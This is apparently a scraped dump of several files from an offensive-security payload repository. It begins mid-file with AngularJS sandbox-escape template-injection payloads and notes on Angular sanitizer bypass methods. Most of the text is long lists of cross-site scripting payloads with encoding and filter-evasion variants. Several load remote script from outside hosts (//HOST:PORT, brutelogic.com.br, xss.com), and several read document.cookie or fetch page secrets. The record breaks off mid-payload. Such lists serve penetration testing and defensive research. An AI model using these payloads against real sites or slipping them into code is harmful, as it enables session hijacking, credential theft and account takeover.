[\"a\",'eval(\"var _ = document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';\n    document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")'].sort(toString.constructor);\n}}\n```\n\n1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n    $eval('a\",eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"')\n}}\n```\n\n1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    a=toString().constructor.prototype;a.charAt=a.trim;\n    $eval('a,eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),a')\n}}\n```\n\n1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    a=toString().constructor.prototype;a.charAt=a.trim;\n    $eval('a,eval(`var _=document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';document.body.appendChild(_);`),a')\n}}\n```\n\n1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)\n\n```javascript\n{{\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;\n    c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};\");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n}}\n```\n\n## Automatic Sanitization\n\n> To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.\n\nHowever, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:\n\n* bypassSecurityTrustHtml\n* bypassSecurityTrustScript\n* bypassSecurityTrustStyle\n* bypassSecurityTrustUrl\n* bypassSecurityTrustResourceUrl\n\nExample of a component using the unsecure method `bypassSecurityTrustUrl`:\n\n```js\nimport { Component, OnInit } from '@angular/core';\n\n@Component({\n  selector: 'my-app',\n  template: `\n    <h4>An untrusted URL:</h4>\n    <p><a class=\"e2e-dangerous-url\" [href]=\"dangerousUrl\">Click me</a></p>\n    <h4>A trusted URL:</h4>\n    <p><a class=\"e2e-trusted-url\" [href]=\"trustedUrl\">Click me</a></p>\n  `,\n})\nexport class App {\n  constructor(private sanitizer: DomSanitizer) {\n    this.dangerousUrl = 'javascript:alert(\"Hi there\")';\n    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);\n  }\n}\n```\n\n![XSS](https://angular.io/generated/images/guide/security/bypass-security-component.png)\n\nWhen doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.\n\n## References\n\n* [Angular Security - May 16, 2023](https://angular.io/guide/security)\n* [Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson (@MtnBer) - July 11, 2024](https://matanber.com/blog/4-char-csti)\n* [Blind XSS AngularJS Payloads - Lewis Ardern - December 7, 2018](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)\n* [Bypass DomSanitizer - Swarna (@swarnakishore) - August 11, 2017](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)\n* [XSS without HTML - CSTI with Angular JS - Gareth Heyes (@garethheyes) - January 27, 2016](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)\n", "timestamp": "2025-10-21T13:30:27.055125"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/Intruders/BRUTELOGIC-XSS-JS.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-JS.txt", "content": "alert`1`\nalert&lpar;1&rpar;\nalert&#x28;1&#x29\nalert&#40;1&#41\n(alert)(1)\na=alert,a(1)\n[1].find(alert)\ntop[\"al\"+\"ert\"](1)\ntop[/al/.source+/ert/.source](1)\nal\\u0065rt(1)\ntop['al\\145rt'](1)\ntop['al\\x65rt'](1)\ntop[8680439..toString(30)](1)\nnavigator.vibrate(500)\neval(URL.slice(-8))>#alert(1)\neval(location.hash.slice(1)>#alert(1)\ninnerHTML=location.hash>#<script>alert(1)</script>\n", "timestamp": "2025-10-21T13:30:27.608783"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt", "content": "<svg onload=alert(1)>\n\"><svg onload=alert(1)//\n\"onmouseover=alert(1)//\n\"autofocus/onfocus=alert(1)//\n'-alert(1)-'\n'-alert(1)//\n\\'-alert(1)//\n</script><svg onload=alert(1)>\n<x contenteditable onblur=alert(1)>lose focus!\n<x onclick=alert(1)>click this!\n<x oncopy=alert(1)>copy this!\n<x oncontextmenu=alert(1)>right click this!\n<x oncut=alert(1)>copy this!\n<x ondblclick=alert(1)>double click this!\n<x ondrag=alert(1)>drag this!\n<x contenteditable onfocus=alert(1)>focus this!\n<x contenteditable oninput=alert(1)>input here!\n<x contenteditable onkeydown=alert(1)>press any key!\n<x contenteditable onkeypress=alert(1)>press any key!\n<x contenteditable onkeyup=alert(1)>press any key!\n<x onmousedown=alert(1)>click this!\n<x onmousemove=alert(1)>hover this!\n<x onmouseout=alert(1)>hover this!\n<x onmouseover=alert(1)>hover this!\n<x onmouseup=alert(1)>click this!\n<x contenteditable onpaste=alert(1)>paste here!\n<script>alert(1)//\n<script>alert(1)<!–\n<script src=//brutelogic.com.br/1.js>\n<script src=//3334957647/1>\n%3Cx onxxx=alert(1)\n<%78 onxxx=1\n<x %6Fnxxx=1\n<x o%6Exxx=1\n<x on%78xx=1\n<x onxxx%3D1\n<X onxxx=1\n<x OnXxx=1\n<X OnXxx=1\n<x onxxx=1 onxxx=1\n<x/onxxx=1\n<x%09onxxx=1\n<x%0Aonxxx=1\n<x%0Conxxx=1\n<x%0Donxxx=1\n<x%2Fonxxx=1\n<x 1='1'onxxx=1\n<x 1=\"1\"onxxx=1\n<x </onxxx=1\n<x 1=\">\" onxxx=1\n<http://onxxx%3D1/\n<x onxxx=alert(1) 1='\n<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>\n'onload=alert(1)><svg/1='\n'>alert(1)</script><script/1='\n*/alert(1)</script><script>/*\n*/alert(1)\">'onload=\"/*<svg/1='\n`-alert(1)\">'onload=\"`<svg/1='\n*/</script>'>alert(1)/*<script/1='\n<script>alert(1)</script>\n<script src=javascript:alert(1)>\n<iframe src=javascript:alert(1)>\n<embed src=javascript:alert(1)>\n<a href=javascript:alert(1)>click\n<math><brute href=javascript:alert(1)>click\n<form action=javascript:alert(1)><input type=submit>\n<isindex action=javascript:alert(1) type=submit value=click>\n<form><button formaction=javascript:alert(1)>click\n<form><input formaction=javascript:alert(1) type=submit value=click>\n<form><input formaction=javascript:alert(1) type=image value=click>\n<form><input formaction=javascript:alert(1) type=image src=SOURCE>\n<isindex formaction=javascript:alert(1) type=submit value=click>\n<object data=javascript:alert(1)>\n<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>\n<svg><script xlink:href=data:,alert(1) />\n<math><brute xlink:href=javascript:alert(1)>click\n<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>\n<html ontouchstart=alert(1)>\n<html ontouchend=alert(1)>\n<html ontouchmove=alert(1)>\n<html ontouchcancel=alert(1)>\n<body onorientationchange=alert(1)>\n\"><img src=1 onerror=alert(1)>.gif\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\nGIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n<script src=\"data:&comma;alert(1)//\n\"><script src=data:&comma;alert(1)//\n<script src=\"//brutelogic.com.br&sol;1.js&num;\n\"><script src=//brutelogic.com.br&sol;1.js&num;\n<link rel=import href=\"data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n\"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n<base href=//0>\n<script/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)\n<body onload=alert(1)>\n<body onpageshow=alert(1)>\n<body onfocus=alert(1)>\n<body onhashchange=alert(1)><a href=#x>click this!#x\n<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x\n<body onscroll=alert(1)><br><br><br><br>\n<body onresize=alert(1)>press F12!\n<body onhelp=alert(1)>press F1! (MSIE)\n<marquee onstart=alert(1)>\n<marquee loop=1 width=0 onfinish=alert(1)>\n<audio src onloadstart=alert(1)>\n<video onloadstart=alert(1)><source>\n<input autofocus onblur=alert(1)>\n<keygen autofocus onfocus=alert(1)>\n<form onsubmit=alert(1)><input type=submit>\n<select onchange=alert(1)><option>1<option>2\n<menu id=x contextmenu=x onshow=alert(1)>right click me!\n", "timestamp": "2025-10-21T13:30:27.719995"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/Intruders/IntrudersXSS.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/IntrudersXSS.txt", "content": "<script>alert('XSS')</script>\n<scr<script>ipt>alert('XSS')</scr<script>ipt>\n\"><script>alert('XSS')</script>\n\"><script>alert(String.fromCharCode(88,83,83))</script>\n<img src=x onerror=alert('XSS');>\n<img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>\n<img src=x:alert(alt) onerror=eval(src) alt=xss>\n\"><img src=x onerror=alert('XSS');>\n\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<svg\fonload=alert(1)>\n<svg/onload=alert('XSS')>\n<svg/onload=alert(String.fromCharCode(88,83,83))>\n<svg id=alert(1) onload=eval(id)>\n\"><svg/onload=alert(String.fromCharCode(88,83,83))>\n\"><svg/onload=alert(/XSS/)\n<body onload=alert(/XSS/.source)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<textarea autofocus onfocus=alert(1)>\n<keygen autofocus onfocus=alert(1)>\n<video/poster/onerror=alert(1)>\n<video><source onerror=\"javascript:alert(1)\">\n<video src=_ onloadstart=\"alert(1)\">\n<details/open/ontoggle=\"alert`1`\">\n<audio src onloadstart=alert(1)>\n<marquee onstart=alert(1)>\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\n<meta/content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"http-equiv=refresh>\ndata:text/html,<script>alert(0)</script>\ndata:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n \">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">\n\" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//\n';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>\njavascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*\njavascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a\njavascript://</title>\"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/\njavascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/*\njavascript://'//\" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*\njavascript://</title></textarea></style></script --><li '//\" '*/alert()/*', onclick=alert()//\njavascript:alert()//--></script></textarea></style></title><a\"//' onclick=alert()//>*/alert()/*\n--></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*\n/</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*\njavascript://--></title></style></textarea></script><svg \"//' onclick=alert()//\n/</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*\n<object onafterscriptexecute=confirm(0)>\n<object onbeforescriptexecute=confirm(0)>\n<script>window['alert'](document['domain'])<script>\n<img src='1' onerror/=alert(0) />\n<script>window['alert'](0)</script>\n<script>parent['alert'](1)</script>\n<script>self['alert'](2)</script>\n<script>top['alert'](3)</script>\n\"><svg onload=alert(1)//\n\"onmouseover=alert(1)//\n\"autofocus/onfocus=alert(1)//\n'-alert(1)-'\n'-alert(1)//\n\\'-alert(1)//\n</script><svg onload=alert(1)>\n<x contenteditable onblur=alert(1)>lose focus!\n<x onclick=alert(1)>click this!\n<x oncopy=alert(1)>copy this!\n<x oncontextmenu=alert(1)>right click this!\n<x oncut=alert(1)>cut this!\n<x ondblclick=alert(1)>double click this!\n<x ondrag=alert(1)>drag this!\n<x contenteditable onfocus=alert(1)>focus this!\n<x contenteditable oninput=alert(1)>input here!\n<x contenteditable onkeydown=alert(1)>press any key!\n<x contenteditable onkeypress=alert(1)>press any key!\n<x contenteditable onkeyup=alert(1)>press any key!\n<x onmousedown=alert(1)>click this!\n<x onmousemove=alert(1)>hover this!\n<x onmouseout=alert(1)>hover this!\n<x onmouseover=alert(1)>hover this!\n<x onmouseup=alert(1)>click this!\n<x contenteditable onpaste=alert(1)>paste here!\n<script>alert(1)//\n<script>alert(1)<!–\n<script src=//brutelogic.com.br/1.js>\n<script src=//3334957647/1>\n%3Cx onxxx=alert(1)\n<%78 onxxx=1\n<x %6Fnxxx=1\n<x o%6Exxx=1\n<x on%78xx=1\n<x onxxx%3D1\n<X onxxx=1\n<x OnXxx=1\n<X OnXxx=1\n<x onxxx=1 onxxx=1\n<x/onxxx=1\n<x%09onxxx=1\n<x%0Aonxxx=1\n<x%0Conxxx=1\n<x%0Donxxx=1\n<x%2Fonxxx=1\n<x 1='1'onxxx=1\n<x 1=\"1\"onxxx=1\n<x </onxxx=1\n<x 1=\">\" onxxx=1\n<http://onxxx%3D1/\n<x onxxx=alert(1) 1='\n<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>\n'onload=alert(1)><svg/1='\n'>alert(1)</script><script/1='\n*/alert(1)</script><script>/*\n*/alert(1)\">'onload=\"/*<svg/1='\n`-alert(1)\">'onload=\"`<svg/1='\n*/</script>'>alert(1)/*<script/1='\n<script>alert(1)</script>\n<script src=javascript:alert(1)>\n<iframe src=javascript:alert(1)>\n<embed src=javascript:alert(1)>\n<a href=javascript:alert(1)>click\n<math><brute href=javascript:alert(1)>click\n<form action=javascript:alert(1)><input type=submit>\n<isindex action=javascript:alert(1) type=submit value=click>\n<form><button formaction=javascript:alert(1)>click\n<form><input formaction=javascript:alert(1) type=submit value=click>\n<form><input formaction=javascript:alert(1) type=image value=click>\n<form><input formaction=javascript:alert(1) type=image src=SOURCE>\n<isindex formaction=javascript:alert(1) type=submit value=click>\n<object data=javascript:alert(1)>\n<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>\n<svg><script xlink:href=data:,alert(1) />\n<math><brute xlink:href=javascript:alert(1)>click\n<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>\n<html ontouchstart=alert(1)>\n<html ontouchend=alert(1)>\n<html ontouchmove=alert(1)>\n<html ontouchcancel=alert(1)>\n<body onorientationchange=alert(1)>\n\"><img src=1 onerror=alert(1)>.gif\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\nGIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n<script src=\"data:&comma;alert(1)//\n\"><script src=data:&comma;alert(1)//\n<script src=\"//brutelogic.com.br&sol;1.js&num;\n\"><script src=//brutelogic.com.br&sol;1.js&num;\n<link rel=import href=\"data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n\"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\n<base href=//0>\n<script/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)\n<body onload=alert(1)>\n<body onpageshow=alert(1)>\n<body onfocus=alert(1)>\n<body onhashchange=alert(1)><a href=#x>click this!#x\n<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x\n<body onscroll=alert(1)><br><br><br><br>\n<body onresize=alert(1)>press F12!\n<body onhelp=alert(1)>press F1! (MSIE)\n<marquee onstart=alert(1)>\n<marquee loop=1 width=0 onfinish=alert(1)>\n<audio src onloadstart=alert(1)>\n<video onloadstart=alert(1)><source>\n<input autofocus onblur=alert(1)>\n<keygen autofocus onfocus=alert(1)>\n<form onsubmit=alert(1)><input type=submit>\n<select onchange=alert(1)><option>1<option>2\n<menu id=x contextmenu=x onshow=alert(1)>right click me!\n<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>\n<img src=\"1\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\" />\n<iframe src=\"javascript:%61%6c%65%72%74%28%31%29\"></iframe>\n<script>$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\"\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\"+$.___+\")\"+\"\\\"\")())();</script>\n<scriptscript>\n<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>\n<script>$=1,alert($)</script>\n<script ~~~>confirm(1)</script ~~~>\n<script>$=1,\\u0061lert($)</script>\n<</script/script><script>eval('\\\\u'+'0061'+'lert(1)')//</script>\n<</script/script><script ~~~>\\u0061lert(1)</script ~~~>\n</style></scRipt><scRipt>alert(1)</scRipt>\n<img/id=\"alert&lpar;&#x27;XSS&#x27;&#x29;\\\"/alt=\\\"/\\\"src=\\\"/\\\"onerror=eval(id&#x29;>\n<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>\n<svg><x><script>alert&#40;&#39;1&#39;&#41</x>\n<iframe src=\"\"/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>\n", "timestamp": "2025-10-21T13:30:27.837147"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/Intruders/JHADDIX_XSS.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/JHADDIX_XSS.txt", "content": "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E\n<<scr\\0ipt/src=http://xss.com/xss.js></script\n%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E\n' onmouseover=alert(/Black.Spook/)\n\"><iframe%20src=\"http://google.com\"%%203E\n'<script>window.onload=function(){document.forms[0].message.value='1';}</script>\nx”</title><img src%3dx onerror%3dalert(1)>\n<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>\n<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>\n<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>\n<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>\n<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>\n<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>\n<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>\n<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>\n<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>\n<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>\n<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>\n<script>alert(document.head.innerHTML.substr(146,20));</script>\n<script>alert(document.head.childNodes[3].text)</script>\n<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>\n<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>\n<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%22)};document.body.appendChild(x);</script>\n<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\\/script>%22)};document.body.appendChild(x);</script>\n<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>\n<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>\n<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>\n<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>\n<iframe src=/ onload=eval(unescape(this.name.replace(/\\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>\n<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> \n<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #\n<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # \n<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#\n<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#\n<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23\n<script for=document event=onreadystatechange>getElementById('safe123').click()</script>\n<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>\n<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>\n<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>\n<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>\n<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>\n<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>\n<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = 